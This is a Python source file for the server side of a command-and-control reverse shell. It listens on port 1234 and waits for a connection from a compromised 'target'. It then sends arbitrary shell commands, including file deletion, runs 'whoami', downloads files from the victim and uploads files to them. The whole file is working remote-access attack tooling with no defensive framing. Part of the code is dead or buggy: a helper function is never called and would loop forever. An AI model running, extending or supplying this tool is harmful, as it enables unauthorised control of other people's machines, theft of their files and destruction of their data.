#!/usr/bin/python3

import socket
from termcolor import colored # python coloring library
import time
import base64


# Getting a shell
def shell():

	global cmd

	while True:

		get_username() # getting username for trgt shell from trgt

		cmd = input(f"{username}@{ip}~> ") # trgt shell prompt
		trgt.send(cmd.encode("utf-8")) # encoding to binary before sending via socket


		#shell_cmd() # shell command support

		if cmd == "exit":  # ✓
			print(colored("\n[-] Closing connection...", 'yellow'))
			time.sleep(2)
			print(colored("[-] Connection Closed\n", 'red'))
			break


		# Changing directory  ✓
		elif cmd[:2] == "cd" and len(cmd) > 1:

			continue # we know that after changing direc nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt


		# Removing file path in linux  ✓
		elif cmd[:2] == "rm" and len(cmd) > 1:

			continue # we know that after removing path nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt


		# Removing file path in Win  ✓
		elif cmd[:3] == "del" and len(cmd) > 1:

			continue # we know that after removing path nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt

		# File download
		elif cmd[:4] == "take":

			with open(cmd[5:], "wb") as file:

				file_content = trgt.recv(1024000)
				file.write(base64.b64decode(file_content)) # Incase the file is an image we have to decode with base64 before downloading

		# File upload
		elif cmd[:4] == "drop":
			try:
				with open(cmd[5:], "rb") as file:

					trgt.send(base64.b64encode(file.read())) # Incase the file is an image we have to encode the image with base64 before sending it

			except:
				fail = "Failed to Upload!!"
				trgt.send(base64.b64encode(fail))

		else:
			result = trgt.recv(1024000) # received response in binary format
			print(result.decode("utf-8")) # decoding response to str format


# C2 server function
def server():

	global ip
	global trgt
	global sock

	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

	ip = "0.0.0.0" # listening on any ip, change it (if you wish to)
	port = 1234 # chnage it (if you wish to)

	sock.bind((ip, port)) # binding ip and port to form a method
	sock.listen(5)

	print(colored('''
[+] Listening For Incoming Connections''', 'green'))

	print(colored("[*] To terminate the session, use: 'exit'", 'blue'))


	trgt, ip = sock.accept()
	print(colored(f"[+] Connections Established From: {ip}\n", 'green'))


# shell Command operations
def shell_cmd():
	
	while True:	
	
		if cmd == "exit":  # ✓
			print(colored("\n[-] Closing connection...", 'yellow'))
			time.sleep(2)
			print(colored("[-] Connection Closed\n", 'red'))
			break

		# Changing directory  ✓
		elif cmd[:2] == "cd" and len(cmd) > 1:

			continue # we know that after changing direc nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt

		# Removing file path in linux  ✓
		elif cmd[:2] == "rm" and len(cmd) > 1:

			continue # we know that after removing path nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt

		# Removing file path in Win  ✓
		elif cmd[:3] == "del" and len(cmd) > 1:

			continue # we know that after removing path nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt

		else:
			result = trgt.recv(102400) # received response in binary format
			print(result.decode("utf-8")) # decoding response to str format


# Getting trgt username
def get_username():

	global username

	username = "whoami" # to know the username of the trgt
	trgt.send(username.encode("utf-8"))


	username = trgt.recv(1024) # received response in binary form
	username = username.decode('utf-8') # decoding to text form

	username = username.strip() # Stripping out EOL spacing


def main():
	server()
	shell()
	sock.close() # Closing listening socket as soon as 'exit' command is used in terminal by C2 server owner to break out of shell() function


if __name__ == '__main__':
	main()

